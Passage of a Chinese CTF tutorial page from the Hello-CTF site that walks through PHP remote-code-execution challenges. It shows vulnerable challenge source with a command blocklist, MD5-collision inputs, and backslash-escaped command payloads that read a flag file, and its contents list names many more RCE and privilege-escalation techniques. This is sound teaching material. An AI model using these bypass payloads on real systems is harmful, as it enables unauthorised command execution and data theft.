        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../Event/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    赛事
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    赛事
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Event/Upcoming_events/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    即将开始
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Event/Now_running/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    正在进行
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Event/Past_events/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    已经结束
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_5" >
        
          
          <label class="md-nav__link" for="__nav_3_5" id="__nav_3_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    办赛指南
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_5">
            <span class="md-nav__icon md-icon"></span>
            
  
    办赛指南
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Event/organize.md" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    None
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-labs/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    靶场
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../hc-toolkit/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    工具
  

    
  </span>
  
  

            </a>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            
  
    工具
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../hc-archive/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    归档
  

    
  </span>
  
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#assert-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        assert() RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#20" class="md-nav__link">
    <span class="md-ellipsis">
      
        %20+关键字绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    <span class="md-ellipsis">
      
        关键字加 绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    <span class="md-ellipsis">
      
        进制转换绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#url" class="md-nav__link">
    <span class="md-ellipsis">
      
        URL 编码取反加 ~ 绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    <span class="md-ellipsis">
      
        输出重定向绕过无回显
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#t" class="md-nav__link">
    <span class="md-ellipsis">
      
        \t 代替空格绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    <span class="md-ellipsis">
      
        `` 代替命令执行函数绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#passthru-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        passthru() RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#more-cat" class="md-nav__link">
    <span class="md-ellipsis">
      
        more 代替 cat 绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#data-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        data 伪协议 RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#eval-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        eval() RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#create_function-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        Create_function() RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#java-mvel" class="md-nav__link">
    <span class="md-ellipsis">
      
        Java MVEL 表达式注入
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#java-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        Java 反射机制 RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#php-810-dev-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        PHP 8.1.0 dev RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#nl" class="md-nav__link">
    <span class="md-ellipsis">
      
        nl /* 绕过长度限制
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#nginx-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        Nginx 日志 RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#data" class="md-nav__link">
    <span class="md-ellipsis">
      
        data 伪协议去掉双斜杠绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    <span class="md-ellipsis">
      
        关键字+双引号绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tab" class="md-nav__link">
    <span class="md-ellipsis">
      
        Tab 键代替空格绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#base64" class="md-nav__link">
    <span class="md-ellipsis">
      
        &lt; 加 |Base64 绕过空格
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    <span class="md-ellipsis">
      
        自增代替关键字绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    <span class="md-ellipsis">
      
        ; 代替 &amp; 与 | 绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_8" class="md-nav__link">
    <span class="md-ellipsis">
      
        * 代替部分关键字绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#0a" class="md-nav__link">
    <span class="md-ellipsis">
      
        %0a 代替 ; 绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ssrf-fastcgi-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        SSRF FastCGI 协议 RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#redis-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        Redis 协议 RCE
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Redis 协议 RCE">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-ssrf-redis" class="md-nav__link">
    <span class="md-ellipsis">
      
        1️⃣ SSRF 与 Redis 结合的核心思路
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#shellshock" class="md-nav__link">
    <span class="md-ellipsis">
      
        Shellshock 提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#apache-mod-cgi" class="md-nav__link">
    <span class="md-ellipsis">
      
        Apache Mod CGI 提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#php-fpm" class="md-nav__link">
    <span class="md-ellipsis">
      
        PHP-FPM 提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#gc-uaf" class="md-nav__link">
    <span class="md-ellipsis">
      
        GC UAF 提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#json-serializer-uaf" class="md-nav__link">
    <span class="md-ellipsis">
      
        Json Serializer UAF 提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_9" class="md-nav__link">
    <span class="md-ellipsis">
      
        &amp;&amp; 代替 &amp; 绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#backtrace-uaf" class="md-nav__link">
    <span class="md-ellipsis">
      
        Backtrace UAF 提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ffi" class="md-nav__link">
    <span class="md-ellipsis">
      
        FFI 扩展提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#iconv" class="md-nav__link">
    <span class="md-ellipsis">
      
        iconv 提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_10" class="md-nav__link">
    <span class="md-ellipsis">
      
        动态加载器提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#bash-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        Bash 错误 RCE（仅支持数字+符号）
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ifs-bash" class="md-nav__link">
    <span class="md-ellipsis">
      
        修改 IFS 绕过 Bash 中禁用空格
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sudo-vi" class="md-nav__link">
    <span class="md-ellipsis">
      
        sudo vi 提权
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ifsnum" class="md-nav__link">
    <span class="md-ellipsis">
      
        \(IFS\)num 代替空格绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#preg_replace-e-rce-foreach" class="md-nav__link">
    <span class="md-ellipsis">
      
        preg_replace() /e 修饰符 RCE 绕过 foreach
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#escapeshellargcmd-rce" class="md-nav__link">
    <span class="md-ellipsis">
      
        escapeshellarg/cmd RCE
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#php" class="md-nav__link">
    <span class="md-ellipsis">
      
        PHP 函数嵌套绕过
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ld_preload" class="md-nav__link">
    <span class="md-ellipsis">
      
        LD_PRELOAD 环境变量提权
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              
              <article class="md-content__inner md-typeset">
                
                  <!-- Tags -->


<!-- Actions -->
<!-- Actions -->


  <!-- Edit button -->
  
    <a
      href="https://github.com/ProbiusOfficial/Hello-CTF/tree/main/docs/hc-web/rce.md"
      title="编辑此页"
      class="md-content__button md-icon"
    >
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
    </a>
  

  <!-- View button -->
  
    
      
    
    <a
      href="https://github.com/ProbiusOfficial/Hello-CTF/tree/main/docs/hc-web/rce.md"
      title="查看本页的源代码"
      class="md-content__button md-icon"
    >
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
    </a>
  


<!-- Page content -->
<div><h1 id="rce">RCE<a class="headerlink" href="#rce" title="Permanent link">¶</a></h1>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-1.md -->
<h3 id="assert-rce">assert() RCE<a class="headerlink" href="#assert-rce" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b16c1ad0e0a243d4ffc103.jpg"></p>
<p>explode() 函数使用一个字符串分割另一个字符串，并返回由字符串组成的数组</p>
<p>那么 $poc2 = assert，assert() 是用来判断一个表达式是否成立</p>
<p>但是他会执行其中的代码，这就存在 RCE</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b16c93d0e0a243d4ffc10b.jpg"></p>
<p>scandir() 函数返回指定目录中的文件和目录的数组，print_r() 函数用于打印，组合起来就是 Linux 中的 ls</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b16cb6d0e0a243d4ffc10c.jpg"></p>
<p>直接访问拿到 flag</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b16cc7d0e0a243d4ffc10d.jpg"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-10.md -->
<h3 id="20">%20+关键字绕过<a class="headerlink" href="#20" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b0a3cfd0e0a243d4ffb064.jpg"></p>
<p>查看源代码发现 ajax 请求，URL 跟上这个文件名去看看</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b0a3e6d0e0a243d4ffb06c.jpg"></p>
<p>拿到了源码，做了过滤</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b0a3f8d0e0a243d4ffb070.jpg"></p>
<p>数字可以传入</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b0a40ad0e0a243d4ffb071.jpg"></p>
<p>字符则不行</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b0a41ad0e0a243d4ffb072.jpg"></p>
<p>查询字符串在解析的过程中会将某些字符删除或用下划线代替</p>
<p>例如将参数前的空格删除</p>
<p>但是 WAF 会因为这个空格导致检测不到 num 这个参数，最终导致 WAF 被绕过</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b0a463d0e0a243d4ffb084.jpg"></p>
<p>后面的常规操作对字符都做了过滤，均使用 chr() 代替</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b0a470d0e0a243d4ffb085.jpg"></p>
<p>有一个 f1agg</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b0a481d0e0a243d4ffb086.jpg"></p>
<p>使用 file_get_contents() 把整个文件读入一个字符串中，最后输出拿到 flagnpm</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b0a4b5d0e0a243d4ffb092.jpg"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-11.md -->
<h3 id="_1">关键字加  绕过<a class="headerlink" href="#_1" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b297a3d0e0a243d4000ef4.png"></p>
<p>打开网页有两个 URL 参数，其中一个是图片的</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b29823d0e0a243d4000f2b.png"></p>
<p>将参数两次 Base64 解码后再 Hex 解码拿到原图片名</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b2989ad0e0a243d4000f56.png"></p>
<p>将参数换成编码后的 index.php</p>
<p>右键图片链接复制参数</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b298e8d0e0a243d4000f75.png"></p>
<p>Base64 解码拿到 flag</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span> <span class="o">||</span> <span class="o">~</span> <span class="nx">E_NOTICE</span><span class="p">);</span>
<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nb">header</span><span class="p">(</span><span class="s1">'content-type:text/html;charset=utf-8'</span><span class="p">);</span>
<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">];</span>
<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'img'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]))</span> 
<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>    <span class="nb">header</span><span class="p">(</span><span class="s1">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span><span class="p">);</span>
<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="nv">$file</span> <span class="o">=</span> <span class="nb">hex2bin</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'img'</span><span class="p">])));</span>
<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>
<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="nv">$file</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">"/[^a-zA-Z0-9.]+/"</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/flag/i"</span><span class="p">,</span> <span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>    <span class="k">echo</span> <span class="s1">'&lt;img src ="./ctf3.jpeg"&gt;'</span><span class="p">;</span>
<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>    <span class="k">die</span><span class="p">(</span><span class="s2">"xixi～ no flag"</span><span class="p">);</span>
<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>    <span class="nv">$txt</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>    <span class="k">echo</span> <span class="s2">"&lt;img src='data:image/gif;base64,"</span> <span class="o">.</span> <span class="nv">$txt</span> <span class="o">.</span> <span class="s2">"'&gt;&lt;/img&gt;"</span><span class="p">;</span>
<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>    <span class="k">echo</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="p">}</span>
<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="k">echo</span> <span class="nv">$cmd</span><span class="p">;</span>
<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="k">echo</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|</span><span class="se">\"</span><span class="s2">|\`|;|,|\*|\?|</span><span class="se">\\</span><span class="s2">|</span><span class="se">\\\\</span><span class="s2">|</span><span class="se">\n</span><span class="s2">|</span><span class="se">\t</span><span class="s2">|</span><span class="se">\r</span><span class="s2">|</span><span class="se">\xA0</span><span class="s2">|\{|\}|\(|\)|\&amp;[^\d]|@|\||</span><span class="se">\\</span><span class="s2">$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i"</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">))</span> <span class="p">{</span>
<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>    <span class="k">echo</span><span class="p">(</span><span class="s2">"forbid ~"</span><span class="p">);</span>
<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>    <span class="k">echo</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>    <span class="k">if</span> <span class="p">((</span><span class="nx">string</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'a'</span><span class="p">]</span> <span class="o">!==</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'b'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'a'</span><span class="p">])</span> <span class="o">===</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'b'</span><span class="p">]))</span> <span class="p">{</span>
<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>        <span class="k">echo</span> <span class="sb">`$cmd`</span><span class="p">;</span>
<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>        <span class="k">echo</span> <span class="p">(</span><span class="s2">"md5 is funny ~"</span><span class="p">);</span>
<a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>    <span class="p">}</span>
<a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a><span class="p">}</span>
<a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>
<a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a><span class="cp">?&gt;</span>
<a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a><span class="x">&lt;html&gt;</span>
<a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a><span class="x">&lt;style&gt;</span>
<a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a><span class="x">  body{</span>
<a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a><span class="x">   background:url(./bj.png)  no-repeat center center;</span>
<a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a><span class="x">   background-size:cover;</span>
<a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a><span class="x">   background-attachment:fixed;</span>
<a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a><span class="x">   background-color:#CCCCCC;</span>
<a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a><span class="x">}</span>
<a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a><span class="x">&lt;/style&gt;</span>
<a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a><span class="x">&lt;body&gt;</span>
<a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a><span class="x">&lt;/body&gt;</span>
<a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a><span class="x">&lt;/html&gt;</span>
</code></pre></div>
<p>需要绕过强比较</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="x">(string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])</span>
</code></pre></div>
<p>需要找到两个不同的字符但是他们的 md5 值是相同的</p>
<p>注意一点，POST 时一定要 urlencode！！！</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="x">#1</span>
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="x">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2   </span>
<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="x">b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2   </span>
<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="x">#2</span>
<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="x">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2   </span>
<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="x">b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%</span>
<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="x">#3</span>
<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="x">$a="\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2";</span>
<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="x">$b="\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2";</span>
</code></pre></div>
<p>关键词被过滤了可以使用反斜杠  绕过</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>l\s%20/
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>ca\t%20/flag
<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>.......
</code></pre></div>
